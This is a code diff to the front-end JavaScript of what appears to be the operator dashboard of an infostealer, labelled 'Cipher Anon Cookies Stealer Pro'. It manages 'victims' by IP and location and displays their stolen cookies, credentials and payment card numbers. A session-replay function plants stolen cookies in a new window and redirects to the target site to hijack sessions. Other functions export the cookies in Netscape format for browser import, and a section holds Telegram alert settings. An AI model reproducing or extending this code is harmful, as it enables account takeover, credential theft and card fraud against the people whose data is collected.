+            // Store original value if not set
+            if (el && !el.dataset.originalValue) {
+                el.dataset.originalValue = el.textContent;
+            }
+        }
+
+        // ============================================================
+        // COPY & DOWNLOAD HELPERS
+        // ============================================================
+
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('✅ Copied!', 'success');
+            }).catch(() => {
+                // Fallback
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.left = '-9999px';
+                ta.style.top = '-9999px';
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); showToast('✅ Copied!', 'success'); } catch(e) { showToast('❌ Copy failed', 'error'); }
+                document.body.removeChild(ta);
+            });
+        }
+
+        function downloadItem(name, value, type) {
+            const data = {
+                name: name,
+                value: value,
+                type: type,
+                exportedAt: new Date().toISOString()
+            };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            const safeName = name.replace(/[^a-zA-Z0-9]/g, '_');
+            a.download = `${type}_${safeName}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 ${type} downloaded`, 'success');
+        }
+
+        // ============================================================
+        // SESSION REPLAY
         // ============================================================
 
         function populateReplayDomains() {
@@ -2093,8 +2406,80 @@
             replaySession(domain);
         }
 
+        function replaySession(domain) {
+            let cookies = {};
+            let actualDomain = domain;
+            let found = false;
+
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                    actualDomain = entryDomain;
+                    found = true;
+                }
+            });
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies found for ' + domain, 'error');
+                return;
+            }
+
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
+                        actualDomain = ed;
+                        cookies = {};
+                        Object.assign(cookies, entry.cookies || {});
+                        break;
+                    }
+                }
+            }
+
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No valid domain found to replay', 'error');
+                return;
+            }
+
+            const win = window.open('', '_blank');
+            if (!win) {
+                showToast('⚠️ Popup blocked. Allow popups.', 'error');
+                return;
+            }
+
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
+                <script>
+                    const cookies = ${JSON.stringify(cookies)};
+                    let count = 0;
+                    Object.entries(cookies).forEach(([name, value]) => {
+                        try { 
+                            document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; 
+                            count++; 
+                        } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('▶️ Replay started for ' + cleanDomain, 'success');
+        }
+
+        function replayFromModal() {
+            if (currentModalDomain) replaySession(currentModalDomain);
+        }
+
         // ============================================================
-        // SESSION TESTER
+        // TEST FUNCTIONS
         // ============================================================
 
         async function testSession(domain) {
@@ -2245,9 +2630,59 @@
             showToast(`✅ ${validCount} reachable, ${results.length - validCount} check manually`, 'success');
         }
 
+        function testFromModal() {
+            if (currentModalDomain) {
+                const btn = document.querySelector('.modal .session-actions .test');
+                if (btn) {
+                    btn.textContent = '⏳';
+                    btn.style.opacity = '0.6';
+                    btn.disabled = true;
+                }
+                testSession(currentModalDomain);
+            }
+        }
+
         // ============================================================
-        // EXPORT VIEW
+        // EXPORT FUNCTIONS
         // ============================================================
+
+        function downloadJSON() {
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 JSON exported', 'success');
+        }
+
+        function downloadNetscape() {
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+            let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
+            allData.forEach(entry => {
+                const cookies = entry.cookies || {};
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
+                Object.entries(cookies).forEach(([name, value]) => {
+                    const expiry = Math.floor(Date.now() / 1000) + 31536000;
+                    lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
+                });
+            });
+            const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('📥 Netscape exported', 'success');
+        }
 
         function exportCSV() {
             if (allData.length === 0) {
@@ -2292,135 +2727,35 @@
             showToast('📥 Raw JSON exported', 'success');
         }
 
-        // ============================================================
-        // MODAL — FIXED: handles both credential formats
-        // ============================================================
-
-        function openModal(domain, stats, source) {
-            currentModalDomain = domain;
-            currentModalStats = stats;
-
-            const overlay = document.getElementById('modalOverlay');
-            const title = source === 'trash' ? `🗑️ ${domain} — ${stats.entries.length} victims in trash` :
-                          `🍪 ${domain} — ${stats.entries.length} victims, ${stats.cookies || 0} cookies`;
-
-            document.getElementById('modalTitle').textContent = title;
-
-            let html = '';
-            const entries = stats.entries || [];
-
-            entries.forEach((entry, localIdx) => {
-                const uniqueId = entry._uniqueId || 'unknown';
-                const flag = getFlagEmoji(entry.countryCode);
-                const cookies = entry.cookies || {};
-                const cookieEntries = Object.entries(cookies);
-                const fullTime = formatFullTime(entry.receivedAt);
-                const ago = timeAgo(entry.receivedAt);
-                const isTrash = source === 'trash';
-                const creds = entry.credentials || [];
-                const cards = entry.cards || [];
-
-                const ua = entry.fingerprint?.userAgent || '';
-                let browser = 'Unknown';
-                if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-                else if (ua.includes('Edg')) browser = 'Edge';
-                else if (ua.includes('Firefox')) browser = 'Firefox';
-                else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-                else if (ua.includes('Opera')) browser = 'Opera';
-                else if (ua.includes('Brave')) browser = 'Brave';
-                else if (ua.includes('PowerShell')) browser = 'PowerShell';
-
-                const deleteFn = isTrash ? `showPermanentDeleteConfirm('${uniqueId}')` : `showDeleteConfirm('${uniqueId}', '${domain}')`;
-                const restoreFn = isTrash ? `showRestoreConfirm('${uniqueId}', '${domain}')` : '';
-
-                // ---- Normalize credentials for modal ----
-                let credHtml = '';
-                if (creds.length) {
-                    credHtml = `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#ec4899;font-size:10px;">🔐 Credentials (${creds.length})</div>`;
-                    creds.forEach(c => {
-                        const name = c.name || c.username || c.field || 'unknown';
-                        const value = c.value || c.password || '';
-                        if (!value || value === '' || value === 'undefined' || value === 'null') return;
-                        credHtml += `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
-                            <span style="color:#ec4899;">${name}</span>
-                            <span style="color:#f1f5f9;font-family:monospace;">${value}</span>
-                            <span style="color:#475569;font-size:8px;">${c.type || 'text'}</span>
-                        </div>`;
-                    });
+        function downloadDomain(domain) {
+            let cookies = {};
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
                 }
-
-                // ---- Normalize cards for modal ----
-                let cardHtml = '';
-                if (cards.length) {
-                    cardHtml = `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#06b6d4;font-size:10px;">💳 Cards (${cards.length})</div>`;
-                    cards.forEach(c => {
-                        let value = c.value || c.number || c.card_number || '';
-                        const name = c.name || c.cardholder || c.holder || 'Unknown';
-                        if (!value || value === '' || value === 'undefined' || value === 'null') return;
-                        // Format expiry if we have month/year
-                        if (c.month && c.year && !value.includes('/')) {
-                            value = c.month + '/' + c.year;
-                        }
-                        cardHtml += `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
-                            <span style="color:#06b6d4;">${name}</span>
-                            <span style="color:#f1f5f9;font-family:monospace;">${value}</span>
-                            <span style="color:#475569;font-size:8px;">${c.type || 'card'}</span>
-                        </div>`;
-                    });
-                }
-
-                html += `
-                    <div class="victim-entry" id="victim-${uniqueId}">
-                        <button class="delete-btn" onclick="${deleteFn}" title="${isTrash ? 'Permanently delete' : 'Move to trash'}">
-                            ${isTrash ? '🗑️' : '🗑️'}
-                        </button>
-                        ${isTrash ? `<button class="delete-btn" style="right:44px;color:#00ff88;" onclick="${restoreFn}" title="Restore">↩️</button>` : ''}
-                        <div class="victim-header">
-                            <span class="flag">${flag}</span>
-                            <span class="ip">${entry.ip}</span>
-                            <span class="country">${entry.country}</span>
-                            <span class="city">📍 ${entry.city}</span>
-                            <span style="font-size:10px;color:#94a3b8;margin-left:4px;">🌐 ${browser}</span>
-                            <span class="time-badge">
-                                <span class="clock-icon">${isTrash ? '🗑️' : '🕐'}</span>
-                                <span class="full-time">${isTrash ? (entry.deletedAt ? formatFullTime(entry.deletedAt) : 'Unknown') : fullTime}</span>
-                                <span class="ago">(${isTrash ? (entry.deletedAt ? timeAgo(entry.deletedAt) : 'Unknown') : ago})</span>
-                            </span>
-                        </div>
-                        <div class="cookies-section">
-                            ${cookieEntries.length === 0 ? '<div style="color:#475569;font-size:10px;">No cookies</div>' : ''}
-                            ${cookieEntries.map(([name, value]) => {
-                                const valuable = isValuable(name);
-                                return `
-                                    <div class="cookie-item">
-                                        <span class="name">${name}</span>
-                                        <span class="value" title="${value}">${value.length > 40 ? value.slice(0,40)+'...' : value}</span>
-                                        ${valuable ? '<span class="valuable-tag">Valuable</span>' : ''}
-                                        <div class="actions">
-                                            <button class="btn-icon" onclick="copyCookie('${value.replace(/'/g, "\\'")}')">📋</button>
-                                            <button class="btn-icon" onclick="downloadCookie('${name}', '${value.replace(/'/g, "\\'")}')">⬇️</button>
-                                        </div>
-                                    </div>
-                                `;
-                            }).join('')}
-                            ${credHtml}
-                            ${cardHtml}
-                        </div>
-                    </div>
-                `;
             });
 
-            document.getElementById('modalContent').innerHTML = html;
-            document.getElementById('testResultModal').className = 'test-result';
-            overlay.classList.add('active');
-        }
+            if (Object.keys(cookies).length === 0) {
+                showToast('❌ No cookies found', 'error');
+                return;
+            }
 
-        function closeModal() {
-            document.getElementById('modalOverlay').classList.remove('active');
+            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
         }
 
         // ============================================================
-        // DELETE FUNCTIONS (unchanged, keep existing)
+        // DELETE FUNCTIONS
         // ============================================================
 
         function showDeleteConfirm(uniqueId, domain) {
@@ -2647,7 +2982,7 @@
         }
 
         // ============================================================
-        // PASSWORD CHANGE
+        // SETTINGS
         // ============================================================
 
         function openSettings() {
@@ -2718,10 +3053,6 @@
             }
         }
 
-        // ============================================================
-        // TELEGRAM SETTINGS
-        // ============================================================
-
         async function loadTelegramSettings() {
             try {
                 const res = await fetch('/api/config/telegram');
@@ -2766,191 +3097,6 @@
             } catch (e) {
                 showToast('❌ Failed to update', 'error');
             }
-        }
-
-        // ============================================================
-        // COPY & DOWNLOAD
-        // ============================================================
-
-        function copyCookie(value) {
-            navigator.clipboard.writeText(value).then(() => {
-                showToast('✅ Cookie copied!', 'success');
-            });
-        }
-
-        function downloadCookie(name, value) {
-            const data = { name: name, value: value, exportedAt: new Date().toISOString() };
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookie_${name}_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast(`📥 Cookie "${name}" downloaded`, 'success');
-        }
-
-        function downloadDomain(domain) {
-            let cookies = {};
-            allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
-                    Object.assign(cookies, entry.cookies || {});
-                }
-            });
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found', 'error');
-                return;
-            }
-
-            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
-        }
-
-        // ============================================================
-        // SESSION REPLAY
-        // ============================================================
-
-        function replaySession(domain) {
-            let cookies = {};
-            let actualDomain = domain;
-            let found = false;
-
-            allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
-                    Object.assign(cookies, entry.cookies || {});
-                    actualDomain = entryDomain;
-                    found = true;
-                }
-            });
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found for ' + domain, 'error');
-                return;
-            }
-
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
-                        actualDomain = ed;
-                        cookies = {};
-                        Object.assign(cookies, entry.cookies || {});
-                        break;
-                    }
-                }
-            }
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No valid domain found to replay', 'error');
-                return;
-            }
-
-            const win = window.open('', '_blank');
-            if (!win) {
-                showToast('⚠️ Popup blocked. Allow popups.', 'error');
-                return;
-            }
-
-            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
-
-            win.document.write(`
-                <!DOCTYPE html>
-                <html><head><title>Loading ${cleanDomain}...</title>
-                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
-                <div class="s"></div>
-                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
-                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
-                <script>
-                    const cookies = ${JSON.stringify(cookies)};
-                    let count = 0;
-                    Object.entries(cookies).forEach(([name, value]) => {
-                        try { 
-                            document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; 
-                            count++; 
-                        } catch(e) {}
-                    });
-                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
-                <\/script>
-            </body></html>
-            `);
-            win.document.close();
-            showToast('▶️ Replay started for ' + cleanDomain, 'success');
-        }
-
-        function replayFromModal() {
-            if (currentModalDomain) replaySession(currentModalDomain);
-        }
-
-        // ============================================================
-        // TEST FROM MODAL
-        // ============================================================
-
-        function testFromModal() {
-            if (currentModalDomain) {
-                const btn = document.querySelector('.modal .session-actions .test');
-                if (btn) {
-                    btn.textContent = '⏳';
-                    btn.style.opacity = '0.6';
-                    btn.disabled = true;
-                }
-                testSession(currentModalDomain);
-            }
-        }
-
-        // ============================================================
-        // EXPORT FUNCTIONS
-        // ============================================================
-
-        function downloadJSON() {
-            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
-            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast('📥 JSON exported', 'success');
-        }
-
-        function downloadNetscape() {
-            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
-            let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
-            allData.forEach(entry => {
-                const cookies = entry.cookies || {};
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
-                Object.entries(cookies).forEach(([name, value]) => {
-                    const expiry = Math.floor(Date.now() / 1000) + 31536000;
-                    lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
-                });
-            });
-            const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast('📥 Netscape exported', 'success');
         }
 
         // ============================================================
